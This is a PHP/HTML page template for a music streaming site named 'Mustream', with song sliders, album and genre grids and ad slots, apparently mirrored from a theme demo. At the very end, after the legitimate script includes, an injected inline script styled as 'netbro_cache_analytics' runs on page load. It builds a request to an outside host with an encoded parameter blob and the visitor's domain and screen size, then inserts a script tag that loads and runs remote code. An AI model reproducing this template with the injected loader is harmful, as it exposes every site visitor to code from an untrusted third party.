...
<html lang="en">
<head>
    <title>Mustream - Music Streaming </title>
    <meta charset="utf-8">
    ...
    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>/assets/js/plugins/swiper/css/swiper.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>/assets/js/plugins/nice_select/nice-select.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>/assets/js/plugins/player/volume.css">
	<link rel="stylesheet" type="text/css" href="<?php echo base_url();?>/assets/js/plugins/scroll/jquery.mCustomScrollbar.css">
...
<body>
        ...
        <div class="ms_sidemenu_wrapper">
            ...
            <div class="ms_sidemenu_inner">
                <div class="ms_logo_inner">
                    <div class="ms_logo">
                        <a href="index-2.html"><img src="assets/images/logo.png" alt="" class="img-fluid"/></a>
                    </div>
                    <div class="ms_logo_open">
                        <a href="index-2.html"><img src="assets/images/open_logo.png" alt="" class="img-fluid"/></a>
                    </div>
                </div>
        ...
        <div class="ms_content_wrapper padder_top80">
                        ...
                        <div class="col-lg-4 col-md-12 padding_right40">
                            ...
                            <div class="ms_weekly_box">
                                <div class="weekly_left">
                                    ...
                                    <div class="w_top_song">
                                        <div class="w_tp_song_img">
                                            <img src="assets/images/weekly/song7.jpg" alt="" class="img-fluid">
                                            <div class="ms_song_overlay">
                                            </div>
                                            <div class="ms_play_icon">
                                                <img src="assets/images/svg/play.svg" alt="">
                            ...
                            <div class="ms_weekly_box ms_active_play">
                                <div class="weekly_left">
                                    ...
                                    <div class="w_top_song">
                                        <div class="w_tp_song_img">
                                            <img src="assets/images/weekly/song8.jpg" alt="" class="img-fluid">
                                            <div class="ms_song_overlay">
                                            </div>
                                            <div class="ms_play_icon">
                                                <div class="ms_bars">
                            ...
                            <div class="ms_weekly_box">
                                <div class="weekly_left">
                                    ...
                                    <div class="w_top_song">
                                        <div class="w_tp_song_img">
                                            <img src="assets/images/weekly/song9.jpg" alt="" class="img-fluid">
                                            <div class="ms_song_overlay">
                                            </div>
                                            <div class="ms_play_icon">
                                                <img src="assets/images/svg/play.svg" alt="">
                ...
                <div class="ms_feature_slider swiper-container">
                    <div class="swiper-wrapper">
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song1.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song2.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song3.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song4.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song5.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/featured/song6.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
			...
			<div class="ms_advr_wrapper">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<a href="#"><img src="assets/images/adv.jpg" alt="" class="img-fluid"/></a>
						</div>
					</div>
				</div>
			</div>
                ...
                <div class="ms_album_slider swiper-container">
                    <div class="swiper-wrapper">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/album/album5.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                        ...
                        <div class="swiper-slide">
                            <div class="ms_rcnt_box">
                                <div class="ms_rcnt_box_img">
                                    <img src="assets/images/album/album6.jpg" alt="">
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_more_icon">
                                            <img src="assets/images/svg/more.svg" alt="">
                ...
                <div class="row">
                    ...
                    <div class="col-lg-4">
                        <div class="ms_genres_box">
                            <img src="assets/images/genrs/img1.jpg" alt="" class="img-fluid" />
                            <div class="ms_main_overlay">
                                <div class="ms_box_overlay"></div>
                                <div class="ms_play_icon">
                                    <img src="assets/images/svg/play.svg" alt="">
                    ...
                    <div class="col-lg-6">
                        <div class="row">
                            <div class="col-lg-4">
                                <div class="ms_genres_box">
                                    <img src="assets/images/genrs/img2.jpg" alt="" class="img-fluid" />
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_play_icon">
                                            <img src="assets/images/svg/play.svg" alt="">
                            ...
                            <div class="col-lg-8">
                                <div class="ms_genres_box">
                                    <img src="assets/images/genrs/img3.jpg" alt="" class="img-fluid" />
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_play_icon">
                                            <img src="assets/images/svg/play.svg" alt="">
                            ...
                            <div class="col-lg-8">
                                <div class="ms_genres_box">
                                    <img src="assets/images/genrs/img5.jpg" alt="" class="img-fluid" />
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_play_icon">
                                            <img src="assets/images/svg/play.svg" alt="">
                            ...
                            <div class="col-lg-4">
                                <div class="ms_genres_box">
                                    <img src="assets/images/genrs/img6.jpg" alt="" class="img-fluid" />
                                    <div class="ms_main_overlay">
                                        <div class="ms_box_overlay"></div>
                                        <div class="ms_play_icon">
                                            <img src="assets/images/svg/play.svg" alt="">
                    ...
                    <div class="col-lg-2">
                        <div class="ms_genres_box">
                            <img src="assets/images/genrs/img4.jpg" alt="" class="img-fluid" />
                            <div class="ms_main_overlay">
                                <div class="ms_box_overlay"></div>
                                <div class="ms_play_icon">
                                    <img src="assets/images/svg/play.svg" alt="">
			...
			<div class="ms_advr_wrapper ms_advr2">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<a href="#"><img src="assets/images/adv1.jpg" alt="" class="img-fluid"/></a>
						</div>
					</div>
				</div>
			</div>
    ...
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/swiper/js/swiper.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/player/jplayer.playlist.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/player/jquery.jplayer.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/player/audio-player.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/player/volume.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/nice_select/jquery.nice-select.min.js"></script>
	<script type="text/javascript" src="<?php echo base_url();?>/assets/js/plugins/scroll/jquery.mCustomScrollbar.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>/assets/js/custom.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mYfmK%2fLrNuqalFLCJX2%2fHU1X%2fghKsb%2fxwMrdt8t4JI6BWZ7jXM17RtSTego%2bDc41Xy%2fqMPCH5Q4AxRwfnwHfGd9HWrGQQ6YNHp9d13Wu5%2fnb8%2bQbqppfEGPIQGcWQYaXNe4zZBHI5hsqVA%2b%2feM0RdmyiR1DMvEPLpn1M0AVE7SF%2ba0MOQLZaXliEZzA%2bZRIb55Rj5gylNIDZH%2fN19frGn37JbhirbqtcQfWiEZoqEswWEEY7boFdXTy6kkepabJUvE7mZpjkhCCwobs%2fLqCQxpsacwaPFkCRt3DD0ab9G26HZ%2fnEKukk4ssp0MJkrBEpHitcxxSyitT4n8RC1tnEYUNc%2fUIpEP3yS0Ub0c6NTu18rxY0CvJraQTWi%2b%2f6DzbYN28CguIYn0AfwykXQG09IVkNv%2b%2b%2fkyKdxFdJA0Ti1ftNtou1ys%2fSvtorT5HUfJhMgBTj%2bPyJTaSQpI5nsCphTULHEQJmFY4xdW%2fTd9vQWb6jNHy5iE06VZA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from kamleshyadav.com/html/miraculous/version1/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Aug 2018 16:08:10 GMT -->
</html>